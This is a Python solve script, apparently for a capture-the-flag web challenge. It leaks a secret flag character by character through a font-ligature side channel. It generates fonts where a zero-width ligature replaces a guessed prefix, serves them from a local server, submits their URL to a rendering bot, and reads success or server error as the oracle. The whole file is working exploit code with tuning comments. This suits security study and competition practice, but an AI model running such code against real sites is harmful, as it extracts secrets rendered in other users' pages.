import fontforge
import requests
import threading
from time import sleep
from http.server import HTTPServer, BaseHTTPRequestHandler


class MyHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-Type", "font/ttf")
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        with open("solve.ttf", "rb") as file:
            self.wfile.write(file.read())


def serve():
    httpd = HTTPServer(("", 8000), MyHandler)
    httpd.serve_forever()


def transform(text):
    text = text.replace("{", "braceleft")
    text = text.replace("}", "braceright")
    text = text.replace("0", "zero")
    text = text.replace("1", "one")
    text = text.replace("2", "two")
    text = text.replace("3", "three")
    text = text.replace("4", "four")
    text = text.replace("5", "five")
    text = text.replace("6", "six")
    text = text.replace("7", "seven")
    text = text.replace("8", "eight")
    text = text.replace("9", "nine")
    return text


def main():
    flag = "bctf{"

    chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}"
    current_char = chars[0]

    while True:
        print(f"Trying {flag}{current_char}")
        opentype = f"""
feature liga {{
    script latn;
    sub {transform(" ".join(flag + current_char))} by solve;
}} liga;
""".lstrip()

        with open("features.fea", "w") as f:
            f.write(opentype)

        font = fontforge.open("RobotoMono-Regular.ttf")  # some arbitrary base font
        for c in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_}{":
            glyph = font.createChar(ord(c), c)
            # Play with this spacing. It should just barely error the site.
            # 5000 for placeholder flag. 3000 for real flag. 32767 is the max
            glyph.width = 3000

        # create the ligature
        flag_glyph = font.createChar(-1, "solve")
        flag_glyph.width = 0
        font.mergeFeature("features.fea")

        font.generate("solve.ttf")  # serve this solve.ttf publicly
        font.close()

        # sleep(2)
        r = requests.post(
            "http://localhost:3001", data={"url": "http://localhost:8000/solve.ttf"}
        )
        if r.status_code == 200:
            flag += current_char
            current_char = chars[0]
            print(f"Found {flag}")
            # sleep(5)
        elif r.status_code == 500:
            current_char = chars[chars.index(current_char) + 1]
        else:
            print(r)


if __name__ == "__main__":
    server_thread = threading.Thread(target=serve)
    server_thread.start()
    sleep(1)

    try:
        main()
    finally:
        if server_thread.is_alive():
            server_thread.join()
